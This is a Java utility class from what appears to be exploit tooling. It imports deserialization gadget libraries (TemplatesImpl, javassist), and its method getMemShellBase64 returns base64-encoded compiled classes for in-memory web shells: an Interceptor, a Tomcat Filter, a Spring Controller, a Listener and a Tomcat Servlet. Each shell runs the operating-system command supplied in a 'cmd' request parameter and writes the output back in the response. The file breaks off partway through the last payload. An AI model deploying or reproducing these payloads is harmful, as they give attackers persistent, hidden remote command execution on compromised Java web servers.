package sample.utils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import sample.exploit.runner.*;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.UUID;

public class ExpUtils {

    public static String getMemShellBase64(String memShellType){
        if (memShellType.equals("Interceptor")){
            return "yv66vgAAADQAhwoAIABFCABGCwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGIHAGYHAGcHAGgBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAD0xDbWRDb250cm9sbGVyOwEACXByZUhhbmRsZQEAZChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7TGphdmEvbGFuZy9PYmplY3Q7KVoBAAFwAQAaTGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcjsBAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAFvAQASTGphdmEvbGFuZy9TdHJpbmc7AQABYwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBTBwBpBwBSBwBZBwBnBwBqBwBrBwBsBwBmAQAKU291cmNlRmlsZQEAEkNtZENvbnRyb2xsZXIuamF2YQwAIQAiAQADY21kBwBqDABtAG4HAGsMAG8AcAEAAAEAB29zLm5hbWUHAHEMAHIAbgwAcwB0AQADd2luDAB1AHYBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAhAHcBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAeAB5BwB6DAB7AHwMACEAfQEAAlxBDAB+AH8MAIAAgQwAggB0DACDACIHAGkMAIQAhQwAhgAiAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEADUNtZENvbnRyb2xsZXIBAEFvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvSGFuZGxlckludGVyY2VwdG9yQWRhcHRlcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAHwAgAAAAAAACAAEAIQAiAAEAIwAAAC8AAQABAAAABSq3AAGxAAAAAgAkAAAABgABAAAABgAlAAAADAABAAAABQAmACcAAAABACgAKQABACMAAAG6AAYACQAAAK8rEgK5AAMCADoEGQTGAKEsuQAEAQA6BRIFOgYSBrgAB7YACBIJtgAKmQAiuwALWQa9AAxZAxINU1kEEg5TWQUZBFO3AA86B6cAH7sAC1kGvQAMWQMSEFNZBBIRU1kFGQRTtwAPOge7ABJZGQe2ABO2ABS3ABUSFrYAFzoIGQi2ABiZAAsZCLYAGacABRkGOgYZCLYAGhkFGQa2ABsZBbYAHBkFtgAdpwAFOgUDrASsAAEADwCmAKkAHgADACQAAABGABEAAAAIAAoACQAPAAsAFwAMABsADgArAA8ASgARAGYAEwB8ABQAkAAVAJUAFgCcABcAoQAYAKYAGgCpABkAqwAbAK0AHQAlAAAAZgAKAEcAAwAqACsABwAXAI8ALAAtAAUAGwCLAC4ALwAGAGYAQAAqACsABwB8ACoAMAAxAAgAAACvACYAJwAAAAAArwAyADMAAQAAAK8ANAA1AAIAAACvADYANwADAAoApQA4AC8ABAA5AAAAOQAH/gBKBwA6BwA7BwA6/AAbBwA8/AAlBwA9QQcAOv8AGgAFBwA+BwA/BwBABwBBBwA6AAEHAEIBAQABAEMAAAACAEQ=";
        } else if (memShellType.equals("Tomcat-Filter")){
            return "yv66vgAAADQAmwoAGwBPCQBQAFEIAFIKAFMAVAgAQQsAVQBWCgBXAFgKAFcAWQcAWgcAWwoAXABdCgAKAF4KAAkAXwcAYAoADgBPCgAJAGEKAA4AYgoADgBjCgAOAGQLAGUAZgoAZwBoCgBpAGoKAGkAawoAaQBsCwBtAG4HAG8HAHAHAHEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADUxGaWx0ZXJTaGVsbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAcgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAA5idWZmZXJlZFJlYWRlcgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEADXN0cmluZ0J1aWxkZXIBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAEbGluZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQADY21kAQANU3RhY2tNYXBUYWJsZQcAbwcAcwcAdAcAdQcAdgcAdwcAWgcAYAcAeAcAeQEAClNvdXJjZUZpbGUBABBGaWx0ZXJTaGVsbC5qYXZhDAAdAB4HAHoMAHsAfAEAB3N1Y2NlZWQHAH0MAH4AfwcAcwwAgACBBwCCDACDAIQMAIUAhgEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwB3DACHAIgMAB0AiQwAHQCKAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAIsAjAwAjQCODACNAI8MAJAAjAcAdAwAkQCSBwB2DACTAJQHAJUMAJYAlwwAmAAeDACZAB4HAHUMADEAmgEAC0ZpbHRlclNoZWxsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAcamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdAEAHWphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlAQAZamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbgEAEGphdmEvbGFuZy9TdHJpbmcBABFqYXZhL2xhbmcvUHJvY2VzcwEAE2phdmEvaW8vSU9FeGNlcHRpb24BAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBABwoQylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtAQAFd3JpdGUBAAUoW0IpVgEABWZsdXNoAQAFY2xvc2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWACEAGgAbAAEAHAAAAAQAAQAdAB4AAQAfAAAALwABAAEAAAAFKrcAAbEAAAACACAAAAAGAAEAAAAMACEAAAAMAAEAAAAFACIAIwAAAAEAJAAlAAIAHwAAAD8AAAADAAAAAbEAAAACACAAAAAGAAEAAAAQACEAAAAgAAMAAAABACIAIwAAAAAAAQAmACcAAQAAAAEAKAApAAIAKgAAAAQAAQArAAEAJAAsAAIAHwAAAEkAAAAEAAAAAbEAAAACACAAAAAGAAEAAAAVACEAAAAqAAQAAAABACIAIwAAAAAAAQAmACcAAQAAAAEALQAuAAIAAAABAC8AMAADACoAAAAEAAEAKwABADEAMgACAB8AAAGAAAUACQAAAJOyAAISA7YABCsSBbkABgIAWToExgB3uAAHGQS2AAg6BbsACVm7AApZGQW2AAu3AAy3AA06BrsADlm3AA86BxkGtgAQWToIxgAgGQe7AA5ZtwAPGQi2ABEQCrYAErYAE7YAEVen/9ssuQAUAQAZB7YAE7YAFbYAFiy5ABQBALYAFyy5ABQBALYAGLEtKyy5ABkDALEAAAADACAAAAA2AA0AAAAZAAgAGwAWABwAIAAdADUAHgA+ACAASQAhAGYAIwB3ACQAgAAlAIkAJgCKACoAkgArACEAAABcAAkAIABqADMANAAFADUAVQA1ADYABgA+AEwANwA4AAcARgBEADkAOgAIAAAAkwAiACMAAAAAAJMAOwA8AAEAAACTAD0APgACAAAAkwA/AEAAAwATAIAAQQA6AAQAQgAAAD0AA/8APgAIBwBDBwBEBwBFBwBGBwBHBwBIBwBJBwBKAAD8ACcHAEf/ACMABQcAQwcARAcARQcARgcARwAAACoAAAAGAAIASwBMAAEATQAAAAIATg==";
        } else if (memShellType.equals("Spring-Controller")){
            return "yv66vgAAADQAlgoAJgBICgBJAEoHAEsKAAMATAoAAwBNCABOCwBPAFALAFEAUggAUwgAVAoAVQBWCgAQAFcIAFgKABAAWQcAWgcAWwgAXAgAXQoADwBeCABfCABgBwBhCgAPAGIKAGMAZAoAFgBlCABmCgAWAGcKABYAaAoAFgBpCgAWAGoKAGsAbAoAawBtCgBrAGoHAG4IAG8IAHAHAHEHAHIBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEUxDb250cm9sbGVyU2hlbGw7AQAFc2hlbGwBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABndyaXRlcgEAFUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAARjb2RlAQANU3RhY2tNYXBUYWJsZQcAcQcAcwcAdAcAWwcAdQcAWgcAYQcAbgEAClNvdXJjZUZpbGUBABRDb250cm9sbGVyU2hlbGwuamF2YQwAJwAoBwB2DAB3AHgBAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzDAB5AHoMAHsAfAEAA2NtZAcAcwwAfQB+BwB0DAB/AIABAAABAAdvcy5uYW1lBwCBDACCAH4MAIMALwEAA3dpbgwAhACFAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAJwCGAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAIcAiAcAiQwAigCLDAAnAIwBAAJcQQwAjQCODACPAJAMAJEALwwAkgAoBwB1DACTAJQMAJUAKAEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAEhAQABPwEAD0NvbnRyb2xsZXJTaGVsbAEAEGphdmEvbGFuZy9PYmplY3QBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2lvL1ByaW50V3JpdGVyAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAUZ2V0UmVxdWVzdEF0dHJpYnV0ZXMBAD0oKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvUmVxdWVzdEF0dHJpYnV0ZXM7AQAKZ2V0UmVxdWVzdAEAKSgpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACooKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoACEAJQAmAAAAAAACAAEAJwAoAAEAKQAAADMAAQABAAAABSq3AAGxAAAAAgAqAAAACgACAAAACAAEAAkAKwAAAAwAAQAAAAUALAAtAAAAAQAuAC8AAQApAAAB1AAGAAgAAADBuAACwAADtgAETLgAAsAAA7YABU0rEga5AAcCAE4txgCgLLkACAEAOgQSCToFEgq4AAu2AAwSDbYADpkAIbsAD1kGvQAQWQMSEVNZBBISU1kFLVO3ABM6BqcAHrsAD1kGvQAQWQMSFFNZBBIVU1kFLVO3ABM6BrsAFlkZBrYAF7YAGLcAGRIatgAbOgcZB7YAHJkACxkHtgAdpwAFGQU6BRkHtgAeGQQZBbYAHxkEtgAgGQS2ACGnAAU6BBIjsBIksAABACEAtgC5ACIAAwAqAAAATgATAAAADAAKAA0AFAAOAB0ADwAhABEAKQASAC0AFAA9ABUAWwAXAHYAGQCMABoAoAAbAKUAHACsAB0AsQAeALYAIAC5AB8AuwAhAL4AIwArAAAAXAAJAFgAAwAwADEABgApAI0AMgAzAAQALQCJADQANQAFAHYAQAAwADEABgCMACoANgA3AAcAAADBACwALQAAAAoAtwA4ADkAAQAUAK0AOgA7AAIAHQCkADwANQADAD0AAABDAAf/AFsABgcAPgcAPwcAQAcAQQcAQgcAQQAA/AAaBwBD/AAlBwBEQQcAQf8AGgAEBwA+BwA/BwBABwBBAAEHAEUBAgABAEYAAAACAEc=";
        } else if (memShellType.equals("Listener")){
            return "yv66vgAAADQAnAoAIABKCgBLAEwHAE0IAE4LAAMATwoAUABRCgBQAFIKAFMAVAcAVQoACQBWCABXCgAJAFgKAAkAWQoACQBaCABbCgAgAFwIADQKAF0AXgoAXwBgCgBfAGEHAGIKABUAYwoAZABlCgBkAGYKAGcAaAoAZwBpCgBnAGoHAGsHAGwHAG0HAG4HAG8HAHABAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAD0xMaXN0ZW5lclNoZWxsOwEAEHJlcXVlc3REZXN0cm95ZWQBACYoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RFdmVudDspVgEAA3NyZQEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0RXZlbnQ7AQAScmVxdWVzdEluaXRpYWxpemVkAQABcwEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAANvdXQBABJMamF2YS9sYW5nL1N0cmluZzsBAAhyZXF1ZXN0RgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAdyZXF1ZXN0AQAnTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3Q7AQAIcmVzcG9uc2UBAChMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2U7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAA1TdGFja01hcFRhYmxlBwBNBwBxBwBVBwByBwBuBwBzBwBrBwBsBwBtAQAKU291cmNlRmlsZQEAEkxpc3RlbmVyU2hlbGwuamF2YQwAIgAjBwBzDAB0AHUBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQADY21kDAB2AHcHAHgMAHkAegwAewB8BwB9DAB+AH8BABFqYXZhL3V0aWwvU2Nhbm5lcgwAIgCAAQACXEEMAIEAggwAgwCEDACFAIYBAAAMAIcAiAcAiQwAigCLBwCMDACNAI4MAI8AkAEAJW9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3QMAJEAkgcAkwwAlAAjDACVAJYHAJcMAJgAmQwAmgAjDACbACMBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BAA1MaXN0ZW5lclNoZWxsAQAQamF2YS9sYW5nL09iamVjdAEAJGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3RMaXN0ZW5lcgEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABBqYXZhL2xhbmcvU3RyaW5nAQAhamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdEV2ZW50AQARZ2V0U2VydmxldFJlcXVlc3QBACAoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA9qYXZhL2xhbmcvQ2xhc3MBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQALZ2V0UmVzcG9uc2UBACooKUxvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZTsBACZvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXNwb25zZQEAC3Jlc2V0QnVmZmVyAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEABWNsb3NlACEAHwAgAAEAIQAAAAMAAQAiACMAAQAkAAAALwABAAEAAAAFKrcAAbEAAAACACUAAAAGAAEAAAANACYAAAAMAAEAAAAFACcAKAAAAAEAKQAqAAEAJAAAADUAAAACAAAAAbEAAAACACUAAAAGAAEAAAAQACYAAAAWAAIAAAABACcAKAAAAAAAAQArACwAAQABAC0AKgABACQAAAHCAAMACgAAAJ0rtgACwAADTSwSBLkABQIAxgCMAU64AAYsEgS5AAUCALYAB7YACE67AAlZLbcAChILtgAMOgQZBLYADZkACxkEtgAOpwAFEg86BSy2ABASEbYAEjoGGQYEtgATGQYstgAUwAAVOgcZB7YAFjoIGQi2ABcZB7YAFrYAGDoJGQkZBbYAGRkJtgAaGQm2ABunAA86BKcACjoEpwAFOgSxAAMAFQCNAJAAHAAVAI0AlQAdABUAjQCaAB4AAwAlAAAAVgAVAAAAFAAIABUAEwAWABUAGAAnABkANgAaAEoAGwBVABwAWwAdAGYAHgBtAB8AcgAgAHwAIQCDACIAiAAjAI0AJwCQACUAkgAnAJUAJgCXACcAnAApACYAAABmAAoANgBXAC4ALwAEAEoAQwAwADEABQBVADgAMgAzAAYAZgAnADQANQAHAG0AIAA2ADcACAB8ABEAOAA5AAkAFQCHADoAOwADAAAAnQAnACgAAAAAAJ0AKwAsAAEACACVADwAPQACAD4AAAAzAAb+AEYHAD8HAEAHAEFBBwBC/wBHAAQHAEMHAEQHAD8HAEAAAQcARUQHAEZEBwBH+gABAAEASAAAAAIASQ==";
        } else if (memShellType.equals("Tomcat-Servlet")){
            return "yv66vgAAADQAWgoADgAwCAAiCwAxADIKADMANAoAMwA1CgA2ADcKADgAOQsAOgA7BwA8CgAJAD0KAD4APwgAQAcAQQcAQgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTFNlcnZsZXRTaGVsbDsBAAVkb0dldAEAUihMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAAWkBAAFJAQAFYnl0ZXMBAAJbQgEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAQQcAQwcARAcAPAcARQcAHQEACkV4Y2VwdGlvbnMHAEYHAEcBAApTb3VyY2VGaWxlAQARU2VydmxldFNoZWxsLmphdmEMAA8AEAcAQwwASABJBwBKDABLAEwMAE0ATgcATwwAUABRBwBFDABSAFMHAEQMAFQAVQEAEGphdmEvbGFuZy9TdHJpbmcMAA8AVgcAVwwAWABZAQACDQoBAAxTZXJ2bGV0U2hlbGwBAB5qYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXQBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABHJlYWQBAAUoW0IpSQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHKFtCSUkpVgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAV3cml0ZQEAFShMamF